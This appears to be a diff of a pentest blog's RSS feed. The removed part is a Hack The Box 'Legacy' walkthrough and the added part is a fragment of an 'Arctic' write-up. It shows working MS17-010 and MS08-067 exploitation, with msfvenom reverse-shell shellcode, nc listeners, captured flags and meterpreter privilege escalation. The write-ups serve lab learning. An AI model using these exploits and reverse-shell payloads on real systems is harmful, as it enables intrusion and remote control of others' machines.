- 5  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution </code></pre><p>MS17-010 is also known as EternalBlue exploit by Microsoft, that affects only Windows Operating System which uses the SMBv1 (Server Message Block version 1). SMBv1 is a network communication protocol which enable shared access to files, printers and ports. Later on, it is very risky of being targeted by ransomware and other attacks.</p><p>As all the exploits are mentioned above, I will choose the appropriate for Remote Code Execution, that is, exploit/windows/smb/ms17_010_psexec (use 4).</p><pre><code class="language-bash">msf6 &gt; use 4
- [*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
- msf6 exploit(windows/smb/ms17_010_psexec) &gt; show options
- Module options (exploit/windows/smb/ms17_010_psexec):
- Name                  Current Setting                                             Required  Description
- ----                  ---------------                                             --------  -----------
-DBGTRACE              false                                                         yes       Show extra debug trace info
-LEAKATTEMPTS          99                                                            yes       How many times to try to leak transaction
-NAMEDPIPE                                                                           no        A named pipe that can be connected to (leave blank for auto)
-NAMED_PIPES         /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check
-RHOSTS                                                                              yes       The target host(s)
-RPORT                 445                                                           yes       The Target port (TCP)
-SERVICE_DESCRIPTION                                                                 no        Service description 
-SERVICE_DISPLAY_NAME                                                                no        The service display name
-SERVICE_NAME                                                                        no        The service name
-SHARE                 ADMIN$                                                        yes       The share to connect to
-SMBDomain             .                                                             no        The Windows domain to use for authentication
-SMBPass                                                                             no        The password for the specified username
-SMBUser                                                                             no        The username to authenticate as
-Payload options (windows/meterpreter/reverse_tcp):
- Name      Current Setting  Required  Description
- ----      ---------------  --------  -----------
- EXITFUNC  thread           yes       Exit technique (Accepted: &apos;&apos;, seh, thread, process, none)
- LHOST     192.168.232.139  yes       The listen address (an interface may be specified)
- LPORT     4444             yes       The listen port
- Exploit target:
- Id  Name
- --  ----
- 0   Automatic
- msf6 exploit(windows/smb/ms17_010_psexec) &gt; set RHOSTS 10.129.1.111
- RHOSTS =&gt; 10.129.1.111
- msf6 exploit(windows/smb/ms17_010_psexec) &gt; set LHOST tun0
- LHOST =&gt; 10.10.14.44
- msf6 exploit(windows/smb/ms17_010_psexec) &gt; exploit
-
- meterpreter &gt; shell
- Microsoft Windows XP [Version 5.1.2600]
- (C) Copyright 1985-2001 Microsoft Corp.
- C:\WINDOWS\system32&gt;</code></pre><h2 id="ms08-067-without-metasploit">MS08-067 (Without Metasploit)</h2><p>For exploiting the Samba manually, there is an exploit available on GitHub <a href="//raw.githubusercontent.com/jivoi/pentest/master/exploit_win/ms08-067.py">here</a>. It&#x2019;s a python script that requires Impacket (you can install it on Kali from <a href="//github.com/CoreSecurity/impacket/">here</a>) and have to implement some of my own code with the default shellcode. Let&#x2019;s make the custom exploit for exploitation. I will use msfvenom to make the shellcode.</p><pre><code class="language-bash">root@kali# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.44 LPORT=443 EXITFUNC=thread -b &quot;\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40&quot; -f py -v shellcode -a x86 --platform windows                
-Found 11 compatible encoders
-Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
-x86/shikata_ga_nai failed with A valid opcode permutation could not be found.
-Attempting to encode payload with 1 iterations of generic/none
-generic/none failed with Encoding failed due to a bad character (index=3, char=0x00)
-Attempting to encode payload with 1 iterations of x86/call4_dword_xor
-x86/call4_dword_xor succeeded with size 348 (iteration=0)
-x86/call4_dword_xor chosen with final size 348
-Payload size: 348 bytes
-Final size of py file: 1953 bytes
-shellcode =  b&quot;&quot;
-shellcode += b&quot;\x2b\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0&quot;
-shellcode += b&quot;\x5e\x81\x76\x0e\xa1\x97\xf8\xe2\x83\xee\xfc&quot;
-shellcode += b&quot;\xe2\xf4\x5d\x7f\x7a\xe2\xa1\x97\x98\x6b\x44&quot;
-shellcode += b&quot;\xa6\x38\x86\x2a\xc7\xc8\x69\xf3\x9b\x73\xb0&quot;
-shellcode += b&quot;\xb5\x1c\x8a\xca\xae\x20\xb2\xc4\x90\x68\x54&quot;
-shellcode += b&quot;\xde\xc0\xeb\xfa\xce\x81\x56\x37\xef\xa0\x50&quot;
-shellcode += b&quot;\x1a\x10\xf3\xc0\x73\xb0\xb1\x1c\xb2\xde\x2a&quot;
-shellcode += b&quot;\xdb\xe9\x9a\x42\xdf\xf9\x33\xf0\x1c\xa1\xc2&quot;
-shellcode += b&quot;\xa0\x44\x73\xab\xb9\x74\xc2\xab\x2a\xa3\x73&quot;
-shellcode += b&quot;\xe3\x77\xa6\x07\x4e\x60\x58\xf5\xe3\x66\xaf&quot;
-shellcode += b&quot;\x18\x97\x57\x94\x85\x1a\x9a\xea\xdc\x97\x45&quot;
-shellcode += b&quot;\xcf\x73\xba\x85\x96\x2b\x84\x2a\x9b\xb3\x69&quot;
-shellcode += b&quot;\xf9\x8b\xf9\x31\x2a\x93\x73\xe3\x71\x1e\xbc&quot;
-shellcode += b&quot;\xc6\x85\xcc\xa3\x83\xf8\xcd\xa9\x1d\x41\xc8&quot;
-shellcode += b&quot;\xa7\xb8\x2a\x85\x13\x6f\xfc\xff\xcb\xd0\xa1&quot;
-shellcode += b&quot;\x97\x90\x95\xd2\xa5\xa7\xb6\xc9\xdb\x8f\xc4&quot;
-shellcode += b&quot;\xa6\x68\x2d\x5a\x31\x96\xf8\xe2\x88\x53\xac&quot;
-shellcode += b&quot;\xb2\xc9\xbe\x78\x89\xa1\x68\x2d\xb2\xf1\xc7&quot;
-shellcode += b&quot;\xa8\xa2\xf1\xd7\xa8\x8a\x4b\x98\x27\x02\x5e&quot;
-shellcode += b&quot;\x42\x6f\x88\xa4\xff\xf2\xe8\xaf\xbb\x90\xe0&quot;
-shellcode += b&quot;\xa1\x96\x43\x6b\x47\xfd\xe8\xb4\xf6\xff\x61&quot;
-shellcode += b&quot;\x47\xd5\xf6\x07\x37\x24\x57\x8c\xee\x5e\xd9&quot;
-shellcode += b&quot;\xf0\x97\x4d\xff\x08\x57\x03\xc1\x07\x37\xc9&quot;
-shellcode += b&quot;\xf4\x95\x86\xa1\x1e\x1b\xb5\xf6\xc0\xc9\x14&quot;
-shellcode += b&quot;\xcb\x85\xa1\xb4\x43\x6a\x9e\x25\xe5\xb3\xc4&quot;
-shellcode += b&quot;\xe3\xa0\x1a\xbc\xc6\xb1\x51\xf8\xa6\xf5\xc7&quot;
-shellcode += b&quot;\xae\xb4\xf7\xd1\xae\xac\xf7\xc1\xab\xb4\xc9&quot;
-shellcode += b&quot;\xee\x34\xdd\x27\x68\x2d\x6b\x41\xd9\xae\xa4&quot;
-shellcode += b&quot;\x5e\xa7\x90\xea\x26\x8a\x98\x1d\x74\x2c\x18&quot;
-shellcode += b&quot;\xff\x8b\x9d\x90\x44\x34\x2a\x65\x1d\x74\xab&quot;
-shellcode += b&quot;\xfe\x9e\xab\x17\x03\x02\xd4\x92\x43\xa5\xb2&quot;
-shellcode += b&quot;\xe5\x97\x88\xa1\xc4\x07\x37&quot;</code></pre><p>Shellcode contains:</p><ul><li>-p windows/shell_reverse_shell &#x2013; It will connect me with a shell.</li><li>LHOST=10.10.14.44 LPORT=443 EXITFUNC=thread &#x2013; Defining the variable for the payload, my IP, the port and how to exit.</li><li>-b &#x201C;\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40&#x201D; &#x2013; Bad characters not to use.</li><li>-f py &#x2013; Output in python format.</li><li>-v shellcode &#x2013; Code set the variable shellcode, instead of default, buf.</li><li>-a x86 and &#x2013;platform windows &#x2013; Describing attacker&#x2019;s enviornment</li></ul><p>In the exploit, you have to upload your system generated shellcode at the place of default. Also setup netcat for listening the system shell.</p><pre><code class="language-bash">root@kali# python ms08-067.py 10.129.1.111 6 445    
-#######################################################################                                                                                                 
-# MS08-067 Exploit
-# This is a modified verion of Debasis Mohanty&apos;s code (https://www.exploit-db.com/exploits/7132/).
-# The return addresses and the ROP parts are ported from metasploit module exploit/windows/smb/ms08_067_netapi
-#
-# Mod in 2018 by Andy Acer
-# - Added support for selecting a target port at the command line.
-# - Changed library calls to allow for establishing a NetBIOS session for SMB transport
-# - Changed shellcode handling to allow for variable length shellcode.
-########################################################################
- $   This version requires the Python Impacket library version to 0_9_17 or newer.
- $
- $   Here&apos;s how to upgrade if necessary:
- $
- $   git clone --branch impacket_0_9_17 --single-branch https://github.com/CoreSecurity/impacket/
- $   cd impacket
- $   pip install .
- #
- Windows XP SP3 English (NX)
- [-]Initiating connection
- [-]connected to ncacn_np:10.129.1.111[\pipe\browser]
- Exploit finish</code></pre><p>I get a callback on my listener.</p><pre><code class="language-bash">root@kali# nc -lnvp 443                                                                                                                                                       
-Ncat: Version 7.70 ( https://nmap.org/ncat )
-Ncat: Listening on :::443
-Ncat: Listening on 0.0.0.0:443
-Ncat: Connection from 10.129.1.111.
-Ncat: Connection from 10.129.1.111:1028.
-Microsoft Windows XP [Version 5.1.2600]
-(C) Copyright 1985-2001 Microsoft Corp.
-C:\WINDOWS\system32&gt;</code></pre><h2 id="ms17-010-without-metasploit">MS17-010 (Without Metasploit)</h2><p>There are few MS17-010 code available on GitHub, but I like to go with this <a href="//github.com/helviojunior/MS17-010">one</a> by Helviojunior. The name of code is send_and_execute.py, so we can upload the payload file using this exploit and run it. Now, we can generate the exe file with msfvenom.</p><pre><code class="language-bash">msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.44 LPORT=443 EXITFUNC=thread -f exe -a x86 --platform windows -o reverse-shell.exe                                        
-No encoder specified, outputting raw payload
-Payload size: 324 bytes
-Final size of exe file: 73802 bytes
-Saved as: reverse-shell.exe</code></pre><p>Also, I will open the netcat for listening.</p><pre><code class="language-bash">root@kali:/opt/MS17-010# python send_and_execute.py 10.129.1.111 reverse-shell.exe 
- Trying to connect to 10.129.1.111:445
- Target OS: Windows 5.1
- Using named pipe: browser
- Groom packets
- attempt controlling next transaction on x86
- success controlling one transaction
- modify parameter count to 0xffffffff to be able to write backward
- leak next transaction
- CONNECTION: 0x81b74c28
- SESSION: 0xe1bd1a70
- FLINK: 0x7bd48
- InData: 0x7ae28
- MID: 0xa
- TRANS1: 0x78b50
- TRANS2: 0x7ac90
- modify transaction struct for arbitrary read/write
- make this SMB session to be SYSTEM
- current TOKEN addr: 0xe22ed998
- userAndGroupCount: 0x3
- userAndGroupsAddr: 0xe22eda38
- overwriting token UserAndGroups
- Sending file GPHZ28.exe&#x2026;
- Opening SVCManager on 10.129.1.111&#x2026;..
- Creating service yDOZ&#x2026;..
- Starting service yDOZ&#x2026;..
- The NETBIOS connection with the remote host timed out.
- Removing service yDOZ&#x2026;..
- ServiceExec Error on: 10.129.1.111
- nca_s_proto_error</code></pre><pre><code class="language-bash">root@kali:~# nc -nlvp 443                                                                                                                                                           
- listening on [any] 443 &#x2026;
- connect to [10.10.14.44] from (UNKNOWN) [10.129.1.111] 1032
- Microsoft Windows XP [Version 5.1.2600]
- (C) Copyright 1985-2001 Microsoft Corp.
- C:\WINDOWS\system32&gt;net user
- net user
- User accounts for \\
- 
- Administrator            Guest                    HelpAssistant            
- john                     SUPPORT_388945a0         
- The command completed with one or more errors.
- zsh: parse error near `Copyright&apos;</code></pre><h2 id="legacy-writeup-user">Legacy writeup: User</h2><p>You have to do directory listing and then you will get the flag.</p><pre><code class="language-bash">C:\Documents and Settings\john\Desktop&gt;dir
-Volume in drive C has no label.
-  Volume Serial Number is 54BF-723B
- Directory of C:\Documents and Settings\john\Desktop
- 16/03/2017  09:19 &#xFFFD;&#xFFFD;    &lt;DIR&gt;     .
- 16/03/2017  09:19 &#xFFFD;&#xFFFD;    &lt;DIR&gt;     ..
- 16/03/2017  09:19 &#xFFFD;&#xFFFD;              32 user.txt
-                1 File(s)            32 bytes
-                2 Dir(s)   6.404.603.904 bytes free
-
- C:\Documents and Settings\john\Desktop&gt;type user.txt
- e69af0e4f443de7e36876fda4ec7644f</code></pre><h2 id="legacy-writeup-root">Legacy writeup: Root</h2><p>Root is easy, do directory listing and get the flag.</p><pre><code class="language-bash">C:\Documents and Settings\Administrator\Desktop&gt;dir 
-Volume in drive C has no label.
-  Volume Serial Number is 54BF-723B
- Directory of C:\Documents and Settings\Administrator\Desktop
- 16/03/2017  09:18 &#xFFFD;&#xFFFD;    &lt;DIR&gt;     .
- 16/03/2017  09:18 &#xFFFD;&#xFFFD;    &lt;DIR&gt;     ..
- 16/03/2017  09:18 &#xFFFD;&#xFFFD;              32 root.txt
-                1 File(s)           32 bytes
-                2 Dir(s)   6.404.567.040 bytes free
- C:\Documents and Settings\Administrator\Desktop&gt;type root.txt
- 993442d258b0e0ec917cae9e695d5713</code></pre><p>If you enjoyed the writeup, then please leave a comment below. Check out our recent writeups <a href="https://sheerazali.com/redcross-writeup-walkthrough-hack-the-box/">Lame</a> and <a href="https://sheerazali.com/how-to-kerberos-its-components-and-function/">Kerberos</a>.</p>]]></content:encoded></item></channel></rss>
+ msf5 post(multi/recon/local_exploit_suggester) &gt; run</code></pre><p>OK so we have some interesting results,</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="/assets/images/blog/2021_05_image-95.png" class="kg-image" alt="Arctic Writeup / Walkthrough Hack the box" loading="lazy" width="770" height="188"><figcaption>x86 results from local_exploit_suggester</figcaption></figure><p>Also, because we are running an x86 architecture meterpreter session on an x64 architecture box, we should additionally try to migrate our meterpreter session to an x64 architecture and re-run the &#x201C;<code>local_exploit_suggester</code>&#x201D; module as they may return different results.</p><h5 id="arctic-writeup-migrating-meterpreter-shell">Arctic Writeup: Migrating meterpreter shell</h5><p>So, lets migrate our <strong>x86</strong> meterpreter session into an <strong>x64</strong> version.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="/assets/images/blog/2021_05_image-96.png" class="kg-image" alt="Arctic Writeup / Walkthrough Hack the box" loading="lazy" width="770" height="120"><figcaption>checking running processes</figcaption></figure><figure class="kg-card kg-image-card kg-card-hascaption"><img src="/assets/images/blog/2021_05_ps-1.png" class="kg-image" alt="Arctic Writeup / Walkthrough Hack the box" loading="lazy" width="770" height="715"><figcaption>checking the running processes to migrate to</figcaption></figure><p>Let&#x2019;s choose a process with <strong>x64 Architecture</strong>,<br>I will be avoiding &#x201C;<code>powershell.exe</code>&#x201D; because using it may cause this process to die, and if &#x201C;<code>powershell.exe&quot;</code> dies our meterpreter session dies.<br>Let&#x2019;s use &#x201C;<code>jrun.exe&quot;</code> with &#x201C;pid = 1140&#x201C;</p><p>So. now we have successfully migrated into an <strong>x64 </strong>version meterpreter session. Lets re-run the &#x201C;<code>local_exploit_suggester&quot;</code></p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="/assets/images/blog/2021_05_screenshot-5.png" class="kg-image" alt="Arctic Writeup / Walkthrough Hack the box" loading="lazy" width="770" height="373"><figcaption>x64 results from local_exploit_suggester</figcaption></figure><p>Comparing the two results from <strong>x86</strong> session and <strong>x64</strong> session, we can deduce that &#x201C;<code>exlpoit/windows/local/ms10_092_scelevator</code>&#x201D; which is ideal for escalating privileges is common to both. Let&#x2019;s try the exploit &#x201C;<code><strong><a href="//www.rapid7.com/db/vulnerabilities/WINDOWS-HOTFIX-MS10-092/" rel="noreferrer noopener">ms10_092</a></strong></code>&#x201C;</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="/assets/images/blog/2021_05_image-99.png" class="kg-image" alt="Arctic Writeup / Walkthrough Hack the box" loading="lazy" width="770" height="604"><figcaption>windows/local/ms10_092_schelevator</figcaption></figure><p>Awesome! &#x1F973; We are <strong>AUTHORITY\SYSTEM</strong> . Here&#x2019;s the root flag.</p><figure class="kg-card kg-image-card"><img src="/assets/images/blog/2021_05_screenshot-6.png" class="kg-image" alt="Arctic Writeup / Walkthrough Hack the box" loading="lazy" width="665" height="606"></figure><p>Until next box, checkout other intriguing writeups <a href="https://sheerazali.com/">here</a></p>]]></content:encoded></item></channel></rss>
